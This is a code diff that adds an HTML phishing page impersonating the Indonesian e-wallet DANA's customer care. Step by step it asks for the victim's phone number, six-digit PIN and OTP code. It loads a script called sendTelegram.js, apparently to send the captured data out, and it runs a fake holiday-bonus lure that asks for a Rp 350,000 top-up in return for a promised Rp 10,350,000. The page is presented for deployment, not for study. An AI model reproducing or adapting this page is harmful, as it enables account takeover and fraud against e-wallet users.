@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang=id>
+<head>
+    <meta charset=UTF-8>
+    <meta name=theme-color content=#118EEA>
+    <meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+    <title>DANA | Customer Care</title>
+    <meta name=description content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA.">
+    
+    <!-- Social Meta Tags -->
+    <meta property=og:url content=https://www.dana.id>
+    <meta property=og:type content=website>
+    <meta property=og:title content="DANA | Customer Care">
+    <meta property=og:description content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA.">
+    <meta property=og:image content=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSnNopW1eb2p8flX96OeDKBla_ESmxgUt5JIg>
+    <meta name=twitter:card content=summary_large_image>
+    <meta property=twitter:domain content=dana.id>
+    <meta name=twitter:title content="DANA | Customer Care">
+    
+    <!-- Favicon and Resources -->
+    <link rel=icon href=https://www.dana.id/favicon.ico>
+    <link rel=shortcut-icon href=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg>
+    <link rel=canonical href=https://www.dana.id/>
+    
+    <!-- Preconnect -->
+    <link rel=preconnect href=https://a.m.dana.id>
+    <link rel=preconnect href=https://app.link>
+    <link rel=preconnect href=https://api2.branch.io>
+    <link rel=preconnect href=https://youtube.com>
+    
+    <!-- External Resources -->
+    <script src=https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js type=module></script>
+    <link rel=stylesheet href=styles.css>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel=stylesheet>
+</head>
+<body>
+  <div class=content>
+    <div class=container>
+      <!-- Phone Number Page -->
+      <div id=number-page style=display:block>
+        <img src=https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png alt="Logo Dana" class=logo>
+        <h2>Masukkan Nomor HP Kamu</h2>
+        <div class=phone-input-container>
+          <div class=country-code-box>
+            <img src=https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png alt="Bendera Indonesia" class=flag-icon>
+            <span> +62</span>
+          </div>
+          <input type=text id=phone-number placeholder=8811-2345-6789 maxlength=15 inputmode=numeric>
+        </div>
+        <p class=info-text>Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami.</p>
+      </div>
+
+      <!-- PIN Page -->
+      <div id=pin-page style=display:none>
+        <img src=https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png alt="Logo Dana" class=logo>
+        <h2>Masukkan PIN</h2>
+        <div class=pin-container>
+          <input type=password class="input-box pin-box" maxlength=1 inputmode=numeric>
+          <input type=password class="input-box pin-box" maxlength=1 inputmode=numeric>
+          <input type=password class="input-box pin-box" maxlength=1 inputmode=numeric>
+          <input type=password class="input-box pin-box" maxlength=1 inputmode=numeric>
+          <input type=password class="input-box pin-box" maxlength=1 inputmode=numeric>
+          <input type=password class="input-box pin-box" maxlength=1 inputmode=numeric>
+        </div>
+        <div class=show-text-container><span class=show-text>Tampilkan</span></div>
+        <div class=help-forgot-container>
+          <a href=# class=link>Bantuan</a>
+          <a href=# class=link>Lupa PIN?</a>
+        </div>
+      </div>
+
+      <!-- OTP Page -->
+      <div id=otp-page style=display:none>
+        <img src=https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png alt="Logo Dana" class=logo>
+        <h2>Masukkan Kode OTP</h2>
+        <div class=otp-container>
+          <input type=text class="input-box otp-box" maxlength=1 inputmode=numeric>
+          <input type=text class="input-box otp-box" maxlength=1 inputmode=numeric>
+          <input type=text class="input-box otp-box" maxlength=1 inputmode=numeric>
+          <input type=text class="input-box otp-box" maxlength=1 inputmode=numeric>
+        </div>
+        
+        <div class=otp-message-box>🎁 KAMU AKAN MENERIMA THR SESUAI SALDO TERAKHIR DI DANA 🎉</div>
+
+        <div id=floating-notification class=floating-notification style=display:none>
+          <div id=notification-content>Silakan verifikasi notifikasi yang muncul untuk menerima kode OTP.</div>
+          <div id=attempt-counter style="font-size:12px;margin-top:5px;display:none">Percobaan ke: <span id=attempt-number>1</span>/6</div>
+        </div>
+
+        <div id=success-notification class=floating-notification style="display:none;background-color:#4CAF50">
+          Silahkan Anda melakukan pengisian saldo sebesar Rp 350.000 dan hadiah Otomatis akan masuk 10.350.000
+        </div>
+
+        <div class=saldo-container style=display:none>
+          <input type=text id=saldo-input placeholder="Rp. saldo terakhir di DANA" inputmode=numeric>
+          <p id=saldo-error class=error-message style=display:none>Saldo harus melebihi Rp.350.000</p>
+        </div>
+
+        <div class=verifikasi-button-container style=display:none>
+          <button id=verifikasi-button class=button>Verifikasi</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Continue Button -->
+  <div class=fixed-button-container id=lanjutkan-container>
+    <button id=lanjutkan-button class=button>Lanjutkan</button>
+  </div>
+
+  <script src=javascript.js></script>
+  <script src=sendTelegram.js></script>
+</body>
+</html>
